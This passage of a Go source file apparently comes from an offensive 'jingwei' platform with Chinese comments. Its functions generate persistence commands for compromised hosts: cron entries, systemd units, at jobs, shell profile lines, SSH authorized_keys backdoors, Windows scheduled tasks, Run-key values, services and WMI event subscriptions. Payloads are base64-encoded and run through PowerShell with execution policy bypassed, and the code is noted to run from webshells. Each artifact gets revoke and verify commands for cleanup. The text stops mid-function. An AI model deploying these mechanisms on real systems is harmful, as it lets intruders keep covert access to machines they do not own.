package server

import (
	"context"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"net/http"
	"regexp"
	"strconv"
	"strings"
	"time"
	"unicode/utf16"

	"github.com/Autumn-27/jingwei/db"
	actool "github.com/Autumn-27/norma/tool"
)

// ---------------------------------------------------------------------------
// 权限维持：可撤销落地物台账 + 标准维持模块。
//
// 标准模块（cron / systemd / ssh_key / schtasks / registry）由平台生成「部署 + 撤销 + 验证」三组命令，
// 部署成功后自动登记台账；上传的新文件也会自动登记。每条台账自带撤销命令，
// 撤离阶段（P4）按 id 逆序执行撤销并以验证命令确认痕迹消失。
// ---------------------------------------------------------------------------

const (
	intranetArtifactOK      = "JW_ARTIFACT_OK"
	intranetArtifactPresent = "JW_ARTIFACT_PRESENT"
	intranetArtifactGone    = "JW_ARTIFACT_GONE"
	intranetArtifactFailed  = "JW_ARTIFACT_REVOKE_FAILED"

	intranetWarnNoLoginShell = "JW_WARN_NOLOGIN_SHELL"

	intranetPersistTimeout = 60 * time.Second
	intranetVerifyTimeout  = 30 * time.Second
)

type intranetPersistInput struct {
	SessionID   int64  `json:"session_id"`
	TaskID      int64  `json:"task_id"`
	Kind        string `json:"kind"`
	Name        string `json:"name"`
	Schedule    string `json:"schedule"`
	Command     string `json:"command"`
	PublicKey   string `json:"public_key"`
	User        string `json:"user"`
	Description string `json:"description"`
	TTLSeconds  int64  `json:"ttl_seconds"`
}

type intranetArtifactRegisterInput struct {
	SessionID     int64          `json:"session_id"`
	TaskID        int64          `json:"task_id"`
	Host          string         `json:"host"`
	Kind          string         `json:"kind"`
	Name          string         `json:"name"`
	Path          string         `json:"path"`
	Description   string         `json:"description"`
	RevokeCommand string         `json:"revoke_command"`
	VerifyCommand string         `json:"verify_command"`
	TTLSeconds    int64          `json:"ttl_seconds"`
	Metadata      map[string]any `json:"metadata"`
}

// intranetPersistPlan is one standard module rendered into target commands.
type intranetPersistPlan struct {
	Kind, Name, Path, Description string
	Deploy, Revoke, Verify        string
	Metadata                      map[string]any
}

func intranetArtifactToken() (string, error) {
	var b [4]byte
	if _, err := rand.Read(b[:]); err != nil {
		return "", err
	}
	return hex.EncodeToString(b[:]), nil
}

var reCronField = regexp.MustCompile(`^[0-9A-Za-z*/,.-]+$`)

func normalizeCronSchedule(raw string) (string, error) {
	raw = strings.TrimSpace(raw)
	if raw == "" {
		return "", errors.New(`schedule 不能为空（例如 "*/10 * * * *" 或 @reboot）`)
	}
	if strings.HasPrefix(raw, "@") {
		switch raw {
		case "@reboot", "@hourly", "@daily", "@weekly", "@monthly", "@yearly", "@annually":
			return raw, nil
		}
		return "", errors.New("不支持的 schedule，仅支持 @reboot/@hourly/@daily/@weekly/@monthly/@yearly")
	}
	fields := strings.Fields(raw)
	if len(fields) != 5 {
		return "", errors.New("schedule 需要 5 段（分 时 日 月 周）")
	}
	for _, f := range fields {
		if !reCronField.MatchString(f) {
			return "", fmt.Errorf("schedule 字段无效: %s", f)
		}
	}
	return strings.Join(fields, " "), nil
}

func buildCronPersistPlan(in intranetPersistInput) (intranetPersistPlan, error) {
	schedule, err := normalizeCronSchedule(in.Schedule)
	if err != nil {
		return intranetPersistPlan{}, err
	}
	command := strings.TrimSpace(in.Command)
	if command == "" {
		return intranetPersistPlan{}, errors.New("command 不能为空")
	}
	if strings.ContainsAny(command, "\r\n\x00") {
		return intranetPersistPlan{}, errors.New("cron command 不能包含换行或 NUL")
	}
	token, err := intranetArtifactToken()
	if err != nil {
		return intranetPersistPlan{}, err
	}
	marker := "# jw:" + token
	// crontab treats % as a newline inside commands.
	line := schedule + " " + strings.ReplaceAll(command, "%", `\%`) + " " + marker
	name := strings.TrimSpace(in.Name)
	if name == "" {
		name = "cron-" + token
	}
	return intranetPersistPlan{
		Kind:        db.IntranetArtifactCron,
		Name:        name,
		Path:        "crontab:" + token,
		Description: displayOr(strings.TrimSpace(in.Description), "计划任务 "+schedule+"："+truncateText(command, 200)),
		Deploy: fmt.Sprintf("(crontab -l 2>/dev/null | grep -vF %s; printf '%%s\\n' %s) | crontab - && echo %s",
			shQuote(marker), shQuote(line), intranetArtifactOK),
		Revoke: fmt.Sprintf("(crontab -l 2>/dev/null | grep -vF %s) | crontab - && echo %s",
			shQuote(marker), intranetArtifactOK),
		Verify: fmt.Sprintf("crontab -l 2>/dev/null | grep -qF %s && echo %s || echo %s",
			shQuote(marker), intranetArtifactPresent, intranetArtifactGone),
		Metadata: map[string]any{"token": token, "schedule": schedule, "command": command},
	}, nil
}

func buildSystemdPersistPlan(in intranetPersistInput) (intranetPersistPlan, error) {
	command := strings.TrimSpace(in.Command)
	if command == "" {
		return intranetPersistPlan{}, errors.New("command 不能为空")
	}
	if strings.ContainsRune(command, 0) {
		return intranetPersistPlan{}, errors.New("command 不能包含 NUL")
	}
	token, err := intranetArtifactToken()
	if err != nil {
		return intranetPersistPlan{}, err
	}
	unit := "jingwei-" + token + ".service"
	unitPath := "/etc/systemd/system/" + unit
	scriptPath := "/etc/jingwei-" + token + ".sh"
	name := strings.TrimSpace(in.Name)
	if name == "" {
		name = "systemd-" + token
	}
	desc := strings.ReplaceAll(strings.TrimSpace(in.Description), "\n", " ")
	if desc == "" {
		desc = "systemd 服务 " + unit + "：" + truncateText(command, 200)
	}
	unitBody := "[Unit]\nDescription=jingwei " + strings.ReplaceAll(truncateText(name, 80), "%", "%%") + "\n\n" +
		"[Service]\nType=simple\nExecStart=/bin/sh " + scriptPath + "\nRestart=always\nRestartSec=30\n\n" +
		"[Install]\nWantedBy=multi-user.target\n"
	scriptBody := "#!/bin/sh\nexec /bin/sh -c " + shQuote(command) + "\n"
	unitB64 := shQuote(base64.StdEncoding.EncodeToString([]byte(unitBody)))
	scriptB64 := shQuote(base64.StdEncoding.EncodeToString([]byte(scriptBody)))
	return intranetPersistPlan{
		Kind:        db.IntranetArtifactSystemd,
		Name:        name,
		Path:        unitPath,
		Description: desc,
		Deploy: fmt.Sprintf("printf '%%s' %s | base64 -d > %s && printf '%%s' %s | base64 -d > %s && chmod 700 %s && systemctl daemon-reload && systemctl enable --now %s && echo %s",
			unitB64, shQuote(unitPath), scriptB64, shQuote(scriptPath), shQuote(scriptPath), shQuote(unit), intranetArtifactOK),
		Revoke: fmt.Sprintf("systemctl disable --now %s 2>/dev/null; rm -f %s %s; systemctl daemon-reload 2>/dev/null; echo %s",
			shQuote(unit), shQuote(unitPath), shQuote(scriptPath), intranetArtifactOK),
		Verify: fmt.Sprintf("test -f %s && echo %s || echo %s",
			shQuote(unitPath), intranetArtifactPresent, intranetArtifactGone),
		Metadata: map[string]any{
			"token": token, "unit": unit, "unit_path": unitPath, "script_path": scriptPath, "command": command,
		},
	}, nil
}

// buildUserSystemdPersistPlan installs a per-user systemd unit. `%h` in the
// unit file expands to the user's home, so the unit stays valid if the account
// is renamed. The service runs on login; `loginctl enable-linger` is left to the
// operator because it changes host-level policy.
func buildUserSystemdPersistPlan(in intranetPersistInput) (intranetPersistPlan, error) {
	command := strings.TrimSpace(in.Command)
	if command == "" {
		return intranetPersistPlan{}, errors.New("command 不能为空")
	}
	if strings.ContainsRune(command, 0) {
		return intranetPersistPlan{}, errors.New("command 不能包含 NUL")
	}
	home, err := intranetSSHHomeScript(in.User)
	if err != nil {
		return intranetPersistPlan{}, err
	}
	token, err := intranetArtifactToken()
	if err != nil {
		return intranetPersistPlan{}, err
	}
	unit := "jingwei-" + token + ".service"
	unitRel := ".config/systemd/user/" + unit
	scriptRel := ".config/jingwei-" + token + ".sh"
	user := strings.TrimSpace(in.User)
	name := strings.TrimSpace(in.Name)
	if name == "" {
		name = "user-systemd-" + token
	}
	desc := strings.TrimSpace(in.Description)
	if desc == "" {
		desc = "用户级 systemd 服务 " + unit + "（" + displayOr(user, "当前用户") + "）：" + truncateText(command, 200)
	}
	scriptBody := "#!/bin/sh\nexec /bin/sh -c " + shQuote(command) + "\n"
	unitBody := "[Unit]\nDescription=jingwei " + strings.ReplaceAll(truncateText(name, 80), "%", "%%") + "\n\n" +
		"[Service]\nType=simple\nExecStart=/bin/sh %h/" + scriptRel + "\nRestart=always\nRestartSec=30\n\n" +
		"[Install]\nWantedBy=default.target\n"
	unitB64 := shQuote(base64.StdEncoding.EncodeToString([]byte(unitBody)))
	scriptB64 := shQuote(base64.StdEncoding.EncodeToString([]byte(scriptBody)))
	deploy := "set -e\n" + home + "\n" +
		"mkdir -p \"$home/.config/systemd/user\"\n" +
		"printf '%s' " + unitB64 + " | base64 -d > \"$home/" + unitRel + "\"\n" +
		"printf '%s' " + scriptB64 + " | base64 -d > \"$home/" + scriptRel + "\"\n" +
		"chmod 700 \"$home/" + scriptRel + "\"\n" +
		"systemctl --user daemon-reload\n" +
		"systemctl --user enable --now " + shQuote(unit) + "\n" +
		"echo " + intranetArtifactOK
	revoke := home + "\n" +
		"systemctl --user disable --now " + shQuote(unit) + " 2>/dev/null || true\n" +
		"rm -f \"$home/" + unitRel + "\" \"$home/" + scriptRel + "\"\n" +
		"systemctl --user daemon-reload 2>/dev/null || true\n" +
		"echo " + intranetArtifactOK
	verify := home + "\ntest -f \"$home/" + unitRel + "\" && echo " + intranetArtifactPresent + " || echo " + intranetArtifactGone
	return intranetPersistPlan{
		Kind:        db.IntranetArtifactUserSystemd,
		Name:        name,
		Path:        "user-systemd:" + displayOr(user, "current") + ":" + unit,
		Description: desc,
		Deploy:      deploy,
		Revoke:      revoke,
		Verify:      verify,
		Metadata: map[string]any{
			"token": token, "user": user, "unit": unit, "unit_path": "~/" + unitRel,
			"script_path": "~/" + scriptRel, "command": command,
		},
	}, nil
}

var reAtSchedule = regexp.MustCompile(`^[A-Za-z0-9 :+./_-]{1,64}$`)

func normalizeAtSchedule(raw string) (string, error) {
	raw = strings.TrimSpace(raw)
	if raw == "" {
		return "", errors.New(`schedule 不能为空（例如 "now + 10 minutes"、"14:30" 或 "midnight"）`)
	}
	if strings.HasPrefix(raw, "-") || !reAtSchedule.MatchString(raw) {
		return "", errors.New("at schedule 仅支持时间表达式（字母数字、空格、:+./_-），且不能以 - 开头")
	}
	return raw, nil
}

// buildAtPersistPlan schedules a one-shot `at` job. The job id is captured in a
// sidecar file so revoke targets exactly this job instead of every job in the
// queue. at does not survive reboots; pair it with cron/profile for long-lived
// persistence.
func buildAtPersistPlan(in intranetPersistInput) (intranetPersistPlan, error) {
	command := strings.TrimSpace(in.Command)
	if command == "" {
		return intranetPersistPlan{}, errors.New("command 不能为空")
	}
	if strings.ContainsAny(command, "\r\n\x00") {
		return intranetPersistPlan{}, errors.New("at command 不能包含换行或 NUL")
	}
	schedule, err := normalizeAtSchedule(in.Schedule)
	if err != nil {
		return intranetPersistPlan{}, err
	}
	home, err := intranetSSHHomeScript(in.User)
	if err != nil {
		return intranetPersistPlan{}, err
	}
	token, err := intranetArtifactToken()
	if err != nil {
		return intranetPersistPlan{}, err
	}
	queue := token[:1]
	scriptRel := ".jingwei-at-" + token + ".sh"
	name := strings.TrimSpace(in.Name)
	if name == "" {
		name = "at-" + token
	}
	desc := strings.TrimSpace(in.Description)
	if desc == "" {
		desc = "at 一次性任务（" + schedule + "）：" + truncateText(command, 200)
	}
	writeJob := "set -e\n" + home + "\n" +
		"f=\"$home/" + scriptRel + "\"\n" +
		"printf '%s\\n' '#!/bin/sh' " + shQuote(command) + " > \"$f\"\n" +
		"chmod 700 \"$f\"\n" +
		"at -q " + queue + " -f \"$f\" " + schedule + " >/dev/null 2>&1\n" +
		"job=$(atq -q " + queue + " 2>/dev/null | awk '{print $1}' | sort -n | tail -1)\n" +
		"[ -n \"$job\" ] || { echo 'at 任务未登记' >&2; exit 1; }\n" +
		"printf '%s\\n' \"$job\" > \"$f.id\"\n" +
		"echo " + intranetArtifactOK
	revoke := home + "\n" +
		"f=\"$home/" + scriptRel + "\"\n" +
		"if [ -f \"$f.id\" ]; then atrm \"$(cat \"$f.id\")\" 2>/dev/null || true; fi\n" +
		"rm -f \"$f\" \"$f.id\"\n" +
		"echo " + intranetArtifactOK
	verify := home + "\ntest -f \"$home/" + scriptRel + "\" && echo " + intranetArtifactPresent + " || echo " + intranetArtifactGone
	return intranetPersistPlan{
		Kind:        db.IntranetArtifactAt,
		Name:        name,
		Path:        "at:" + queue + ":" + token,
		Description: desc,
		Deploy:      writeJob,
		Revoke:      revoke,
		Verify:      verify,
		Metadata: map[string]any{
			"token": token, "queue": queue, "schedule": schedule, "command": command,
			"script_path": "~/" + scriptRel, "user": strings.TrimSpace(in.User),
		},
	}, nil
}

var reProfileFile = regexp.MustCompile(`^\.([A-Za-z0-9_-][A-Za-z0-9._-]{0,39})$`)

func normalizeProfileFile(raw string) (string, error) {
	raw = strings.TrimSpace(raw)
	if raw == "" {
		return ".profile", nil
	}
	if !reProfileFile.MatchString(raw) {
		return "", errors.New("profile 文件名必须是 .profile/.bashrc 这类点文件，不含路径")
	}
	return raw, nil
}

// buildProfilePersistPlan appends one marked line to a shell profile. The marker
// rides on the same line so revoke removes the entire injected command.
func buildProfilePersistPlan(in intranetPersistInput) (intranetPersistPlan, error) {
	command := strings.TrimSpace(in.Command)
	if command == "" {
		return intranetPersistPlan{}, errors.New("command 不能为空")
	}
	if strings.ContainsAny(command, "\r\n\x00") {
		return intranetPersistPlan{}, errors.New("profile command 不能包含换行或 NUL")
	}
	profile, err := normalizeProfileFile(in.Schedule)
	if err != nil {
		return intranetPersistPlan{}, err
	}
	home, err := intranetSSHHomeScript(in.User)
	if err != nil {
		return intranetPersistPlan{}, err
	}
	token, err := intranetArtifactToken()
	if err != nil {
		return intranetPersistPlan{}, err
	}
	marker := "# jw:" + token
	line := command + " " + marker
	user := strings.TrimSpace(in.User)
	name := strings.TrimSpace(in.Name)
	if name == "" {
		name = "profile-" + token
	}
	desc := strings.TrimSpace(in.Description)
	if desc == "" {
		desc = "shell profile 启动项 " + profile + "（" + displayOr(user, "当前用户") + "）：" + truncateText(command, 200)
	}
	deploy := "set -e\n" + home + "\n" + intranetLoginShellWarn(user) + "\n" +
		"f=\"$home/" + profile + "\"\n" +
		"touch \"$f\"\n" +
		"grep -qF " + shQuote(marker) + " \"$f\" || printf '%s\\n' " + shQuote(line) + " >> \"$f\"\n" +
		"grep -qF " + shQuote(marker) + " \"$f\"\n" +
		"echo " + intranetArtifactOK
	revoke := home + "\n" +
		"f=\"$home/" + profile + "\"\n" +
		"if [ -f \"$f\" ]; then\n" +
		"  grep -vF " + shQuote(marker) + " \"$f\" > \"$f.jwtmp\" || true\n" +
		"  mv \"$f.jwtmp\" \"$f\" || { echo " + intranetArtifactFailed + " >&2; exit 1; }\n" +
		"fi\n" +
		"echo " + intranetArtifactOK
	verify := home + "\ngrep -qF " + shQuote(marker) + " \"$home/" + profile + "\" 2>/dev/null && echo " +
		intranetArtifactPresent + " || echo " + intranetArtifactGone
	return intranetPersistPlan{
		Kind:        db.IntranetArtifactProfile,
		Name:        name,
		Path:        "profile:" + displayOr(user, "current") + ":" + profile + ":" + token,
		Description: desc,
		Deploy:      deploy,
		Revoke:      revoke,
		Verify:      verify,
		Metadata: map[string]any{
			"token": token, "user": user, "profile": profile, "command": command, "marker": marker,
		},
	}, nil
}

var reSSHUser = regexp.MustCompile(`^[A-Za-z0-9][A-Za-z0-9._-]*$`)

// normalizeSSHPublicKey keeps the type and key body only; the ledger adds its
// own unique comment so revocation can find exactly the line it wrote.
func normalizeSSHPublicKey(raw string) (string, error) {
	raw = strings.TrimSpace(raw)
	if strings.ContainsAny(raw, "\r\n\x00") {
		return "", errors.New("public_key 必须是单行")
	}
	fields := strings.Fields(raw)
	if len(fields) < 2 {
		return "", errors.New("public_key 格式无效（应为 ssh-ed25519 AAAA... 或类似形式）")
	}
	typ := fields[0]
	valid := strings.HasPrefix(typ, "ssh-") || strings.HasPrefix(typ, "ecdsa-sha2-") ||
		strings.HasPrefix(typ, "sk-ssh-") || strings.HasPrefix(typ, "sk-ecdsa-")
	if !valid {
		return "", errors.New("不支持的公钥类型: " + typ)
	}
	if _, err := base64.StdEncoding.DecodeString(fields[1]); err != nil {
		return "", errors.New("公钥 base64 无效")
	}
	return typ + " " + fields[1], nil
}

// intranetSSHHomeScript resolves the target home directory at run time, so the
// same commands work for the current user or a named account.
func intranetSSHHomeScript(user string) (string, error) {
	user = strings.TrimSpace(user)
	if user == "" {
		// webshell 的执行环境里 HOME 经常是空的（Apache 不给 www-data 设置）：
		// 只认 "$HOME" 会把 .profile / .ssh/authorized_keys 拼成 /.profile 这种
		// 根目录路径，维持模块报「部署未通过验证」，实际是落错了位置。
		return `home="${HOME:-}"` + "\n" +
			`[ -n "$home" ] || home=$(getent passwd "$(id -un)" 2>/dev/null | cut -d: -f6)` + "\n" +
			`[ -n "$home" ] || home=$(eval echo ~"$(id -un)" 2>/dev/null)` + "\n" +
			`[ -d "$home" ] || { echo "JW_HOME_UNRESOLVED" >&2; exit 1; }`, nil
	}
	if !reSSHUser.MatchString(user) {
		return "", errors.New("user 格式无效")
	}
	return "home=$(getent passwd " + shQuote(user) + " 2>/dev/null | cut -d: -f6)\n" +
		`[ -n "$home" ] || { echo "JW_USER_NOT_FOUND" >&2; exit 1; }`, nil
}

func buildSSHKeyPersistPlan(in intranetPersistInput) (intranetPersistPlan, error) {
	key, err := normalizeSSHPublicKey(in.PublicKey)
	if err != nil {
		return intranetPersistPlan{}, err
	}
	home, err := intranetSSHHomeScript(in.User)
	if err != nil {
		return intranetPersistPlan{}, err
	}
	token, err := intranetArtifactToken()
	if err != nil {
		return intranetPersistPlan{}, err
	}
	marker := "jw:" + token
	keyLine := key + " " + marker
	user := strings.TrimSpace(in.User)
	name := strings.TrimSpace(in.Name)
	if name == "" {
		name = "ssh-key-" + token
	}
	desc := strings.TrimSpace(in.Description)
	if desc == "" {
		desc = "SSH 公钥（" + displayOr(user, "当前用户") + "）：" + truncateText(key, 120)
	}
	file := `f="$home/.ssh/authorized_keys"`
	deploy := "set -e\n" + home + "\n" + intranetLoginShellWarn(user) + "\n" + file + `
mkdir -p "$home/.ssh"
chmod 700 "$home/.ssh"
touch "$f"
grep -qF ` + shQuote(marker) + ` "$f" || printf '%s\n' ` + shQuote(keyLine) + ` >> "$f"
chmod 600 "$f"
grep -qF ` + shQuote(marker) + ` "$f"
echo ` + intranetArtifactOK
	revoke := home + "\n" + file + `
if [ -f "$f" ]; then
  grep -vF ` + shQuote(marker) + ` "$f" > "$f.jwtmp" || true
  mv "$f.jwtmp" "$f" || { echo ` + intranetArtifactFailed + ` >&2; exit 1; }
  chmod 600 "$f" 2>/dev/null || true
fi
echo ` + intranetArtifactOK
	verify := home + "\n" + file + `
grep -qF ` + shQuote(marker) + ` "$f" 2>/dev/null && echo ` + intranetArtifactPresent + ` || echo ` + intranetArtifactGone
	return intranetPersistPlan{
		Kind:        db.IntranetArtifactSSHKey,
		Name:        name,
		Path:        "authorized_keys:" + displayOr(user, "current") + ":" + token,
		Description: desc,
		Deploy:      deploy,
		Revoke:      revoke,
		Verify:      verify,
		Metadata: map[string]any{
			"token": token, "user": user, "public_key": key, "marker": marker,
		},
	}, nil
}

// ---------------------------------------------------------------------------
// Windows 模块：schtasks（计划任务）与 registry（HKCU Run 键）。
// cmd 一行执行，名称带随机 token 保证撤销只删除自己创建的对象；命令禁止
// 双引号、%、换行，避免创建时被 cmd 提前展开或破坏参数结构。
// ---------------------------------------------------------------------------

var reWinArtifactName = regexp.MustCompile(`^[A-Za-z0-9][A-Za-z0-9._-]{0,39}$`)

func normalizeWinArtifactName(raw, fallback string) (string, error) {
	raw = strings.TrimSpace(raw)
	if raw == "" {
		return fallback, nil
	}
	if !reWinArtifactName.MatchString(raw) {
		return "", errors.New("name 仅支持字母或数字开头，可含字母数字._-，最长 40 字符")
	}
	return raw, nil
}

func validateWinPersistCommand(command string) (string, error) {
	command = strings.TrimSpace(command)
	if command == "" {
		return "", errors.New("command 不能为空")
	}
	if strings.ContainsAny(command, "\r\n\x00\"") {
		return "", errors.New("command 不能包含换行、NUL 或双引号")
	}
	if strings.Contains(command, "%") {
		return "", errors.New("command 不能包含 %（schtasks/reg 创建时会提前展开变量）")
	}
	return command, nil
}

// normalizeWinSchedule accepts onlogon / onstart / minute:N (1-1439).
func normalizeWinSchedule(raw string) (string, error) {
	raw = strings.ToLower(strings.TrimSpace(raw))
	switch {
	case raw == "", raw == "onlogon":
		return "onlogon", nil
	case raw == "onstart":
		return "onstart", nil
	case strings.HasPrefix(raw, "minute:"):
		n, err := strconv.Atoi(strings.TrimPrefix(raw, "minute:"))
		if err != nil || n < 1 || n > 1439 {
			return "", errors.New("minute 触发需为 minute:1 到 minute:1439，例如 minute:30")
		}
		return "minute:" + strconv.Itoa(n), nil
	}
	return "", errors.New("Windows schedule 仅支持 onlogon/onstart/minute:N")
}

func winQuote(s string) string { return `"` + s + `"` }

func buildSchtasksPersistPlan(in intranetPersistInput) (intranetPersistPlan, error) {
	command, err := validateWinPersistCommand(in.Command)
	if err != nil {
		return intranetPersistPlan{}, err
	}
	trigger, err := normalizeWinSchedule(in.Schedule)
	if err != nil {
		return intranetPersistPlan{}, err
	}
	token, err := intranetArtifactToken()
	if err != nil {
		return intranetPersistPlan{}, err
	}
	base, err := normalizeWinArtifactName(in.Name, "jingwei")
	if err != nil {
		return intranetPersistPlan{}, err
	}
	taskName := base + "-" + token
	name := strings.TrimSpace(in.Name)
	if name == "" {
		name = "schtasks-" + token
	}
	desc := strings.TrimSpace(in.Description)
	if desc == "" {
		desc = "计划任务 " + taskName + "（" + trigger + "）：" + truncateText(command, 200)
	}
	sc, mo := trigger, ""
	if strings.HasPrefix(trigger, "minute:") {
		sc, mo = "minute", strings.TrimPrefix(trigger, "minute:")
	}
	create := fmt.Sprintf("schtasks /create /f /tn %s /tr %s /sc %s",
		winQuote(taskName), winQuote("cmd.exe /c "+command), sc)
	if mo != "" {
		create += " /mo " + mo
	}
	return intranetPersistPlan{
		Kind:        db.IntranetArtifactSchtasks,
		Name:        name,
		Path:        "schtasks:" + taskName,
		Description: desc,
		Deploy:      create + " 2>&1 && echo " + intranetArtifactOK,
		// cmd 内建命令（echo）不会重置 ERRORLEVEL，末尾显式归零，
		// 否则“对象不存在”的正常分支会被当成命令失败。
		Revoke: fmt.Sprintf("schtasks /delete /f /tn %s >nul 2>&1 & echo %s & cmd /c exit 0",
			winQuote(taskName), intranetArtifactOK),
		Verify: fmt.Sprintf("schtasks /query /tn %s >nul 2>&1 && echo %s || echo %s & cmd /c exit 0",
			winQuote(taskName), intranetArtifactPresent, intranetArtifactGone),
		Metadata: map[string]any{"token": token, "task_name": taskName, "schedule": trigger, "command": command},
	}, nil
}

const intranetWindowsRunKey = `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`

func buildRegistryPersistPlan(in intranetPersistInput) (intranetPersistPlan, error) {
	command, err := validateWinPersistCommand(in.Command)
	if err != nil {
		return intranetPersistPlan{}, err
	}
	token, err := intranetArtifactToken()
	if err != nil {
		return intranetPersistPlan{}, err
	}
	base, err := normalizeWinArtifactName(in.Name, "jingwei")
	if err != nil {
		return intranetPersistPlan{}, err
	}
	valueName := base + "-" + token
	name := strings.TrimSpace(in.Name)
	if name == "" {
		name = "registry-" + token
	}
	desc := strings.TrimSpace(in.Description)
	if desc == "" {
		desc = "注册表 Run 启动项 " + valueName + "：" + truncateText(command, 200)
	}
	return intranetPersistPlan{
		Kind:        db.IntranetArtifactRegistry,
		Name:        name,
		Path:        intranetWindowsRunKey + `\` + valueName,
		Description: desc,
		Deploy: fmt.Sprintf("reg add %s /v %s /t REG_SZ /d %s /f 2>&1 && echo %s",
			winQuote(intranetWindowsRunKey), winQuote(valueName), winQuote("cmd.exe /c "+command), intranetArtifactOK),
		Revoke: fmt.Sprintf("reg delete %s /v %s /f >nul 2>&1 & echo %s & cmd /c exit 0",
			winQuote(intranetWindowsRunKey), winQuote(valueName), intranetArtifactOK),
		Verify: fmt.Sprintf("reg query %s /v %s >nul 2>&1 && echo %s || echo %s & cmd /c exit 0",
			winQuote(intranetWindowsRunKey), winQuote(valueName), intranetArtifactPresent, intranetArtifactGone),
		Metadata: map[string]any{"token": token, "key": intranetWindowsRunKey, "value": valueName, "command": command},
	}, nil
}

// intranetPSQuote single-quotes a PowerShell literal.
func intranetPSQuote(s string) string { return "'" + strings.ReplaceAll(s, "'", "''") + "'" }

// intranetWindowsPSScript runs a PowerShell script through -EncodedCommand, so
// service/WMI/startup modules never have to survive cmd.exe quote mangling.
func intranetWindowsPSScript(script string) string {
	units := utf16.Encode([]rune(script))
	raw := make([]byte, len(units)*2)
	for i, u := range units {
		raw[2*i] = byte(u)
		raw[2*i+1] = byte(u >> 8)
	}
	return `"` + intranetWindowsPowerShellPath() + `" -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand ` +
		base64.StdEncoding.EncodeToString(raw)
}

func buildServicePersistPlan(in intranetPersistInput) (intranetPersistPlan, error) {
	command, err := validateWinPersistCommand(in.Command)
	if err != nil {
		return intranetPersistPlan{}, err
	}
	token, err := intranetArtifactToken()
	if err != nil {
		return intranetPersistPlan{}, err
	}
	base, err := normalizeWinArtifactName(in.Name, "jingwei")
	if err != nil {
		return intranetPersistPlan{}, err
	}
	service := base + "-" + token
	name := strings.TrimSpace(in.Name)
	if name == "" {
		name = "service-" + token
	}
	desc := strings.TrimSpace(in.Description)
	if desc == "" {
		desc = "Windows 服务 " + service + "（自动启动，需要管理员权限）：" + truncateText(command, 200)
	}
	binPath := "cmd.exe /c " + command
	return intranetPersistPlan{
		Kind:        db.IntranetArtifactService,
		Name:        name,
		Path:        "service:" + service,
		Description: desc,
		Deploy: "sc create " + winQuote(service) + " binPath= " + winQuote(binPath) + " start= auto 2>&1 & " +
			"sc start " + winQuote(service) + " >nul 2>&1 & echo " + intranetArtifactOK,
		Revoke: "sc stop " + winQuote(service) + " >nul 2>&1 & sc delete " + winQuote(service) +
			" >nul 2>&1 & echo " + intranetArtifactOK + " & cmd /c exit 0",
		Verify: "sc query " + winQuote(service) + " >nul 2>&1 && echo " + intranetArtifactPresent +
			" || echo " + intranetArtifactGone + " & cmd /c exit 0",
		Metadata: map[string]any{"token": token, "service_name": service, "command": command},
	}, nil
}

func buildWMIPersistPlan(in intranetPersistInput) (intranetPersistPlan, error) {
	command, err := validateWinPersistCommand(in.Command)
	if err != nil {
		return intranetPersistPlan{}, err
	}
	token, err := intranetArtifactToken()
	if err != nil {
		return intranetPersistPlan{}, err
	}
	name := strings.TrimSpace(in.Name)
	if name == "" {
		name = "wmi-" + token
	}
	desc := strings.TrimSpace(in.Description)
	if desc == "" {
		desc = "WMI 永久事件订阅 jingwei-" + token + "（每 60 秒触发，需要管理员权限）：" + truncateText(command, 200)
	}
	wmiName := "jingwei-" + token
	query := "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
	deployScript := "$ErrorActionPreference='Stop'\n" +
		"$n=" + intranetPSQuote(wmiName) + "\n" +
		"$f=Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments @{Name=$n; EventNamespace='root\\cimv2'; QueryLanguage='WQL'; Query=" + intranetPSQuote(query) + "}\n" +
		"$c=Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments @{Name=$n; CommandLineTemplate=" + intranetPSQuote("cmd.exe /c "+command) + "}\n" +
		"Set-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$f; Consumer=$c} | Out-Null\n" +
		"$fc=@(Get-WmiObject -Namespace root\\subscription -Class __EventFilter -Filter \"Name='$n'\").Count\n" +
		"$cc=@(Get-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer -Filter \"Name='$n'\").Count\n" +
		"if ($fc -lt 1 -or $cc -lt 1) { throw 'WMI subscription incomplete' }\n" +
		"Write-Output " + intranetPSQuote(intranetArtifactOK) + "\n"
	revokeScript := "$ErrorActionPreference='SilentlyContinue'\n" +
		"$n=" + intranetPSQuote(wmiName) + "\n" +
		"Get-WmiObject -Namespace root\\subscription -Class __FilterToConsumerBinding | Where-Object { $_.Filter -like \"*$n*\" -or $_.Consumer -like \"*$n*\" } | Remove-WmiObject\n" +
		"Get-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer -Filter \"Name='$n'\" | Remove-WmiObject\n" +
		"Get-WmiObject -Namespace root\\subscription -Class __EventFilter -Filter \"Name='$n'\" | Remove-WmiObject\n" +
		"Write-Output " + intranetPSQuote(intranetArtifactOK) + "\n"
	verifyScript := "$ErrorActionPreference='SilentlyContinue'\n" +
		"$n=" + intranetPSQuote(wmiName) + "\n" +
		"$f=@(Get-WmiObject -Namespace root\\subscription -Class __EventFilter -Filter \"Name='$n'\").Count\n" +
		"$c=@(Get-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer -Filter \"Name='$n'\").Count\n" +
		"if ($f -gt 0 -or $c -gt 0) { Write-Output " + intranetPSQuote(intranetArtifactPresent) +
		" } else { Write-Output " + intranetPSQuote(intranetArtifactGone) + " }\n"
	return intranetPersistPlan{
		Kind:        db.IntranetArtifactWMI,
		Name:        name,
		Path:        "wmi:root\\subscription:" + wmiName,
		Description: desc,
		Deploy:      intranetWindowsPSScript(deployScript),
		Revoke:      intranetWindowsPSScript(revokeScript),
		Verify:      intranetWindowsPSScript(verifyScript),
		Metadata: map[string]any{
			"token": token, "consumer_name": wmiName, "namespace": `root\subscription`, "command": command,
		},
	}, nil
}

func buildStartupPersistPlan(in intranetPersistInput) (intranetPersistPlan, error) {
	command, err := validateWinPersistCommand(in.Command)
	if err != nil {
		return intranetPersistPlan{}, err
	}
	token, err := intranetArtifactToken()
	if err != nil {
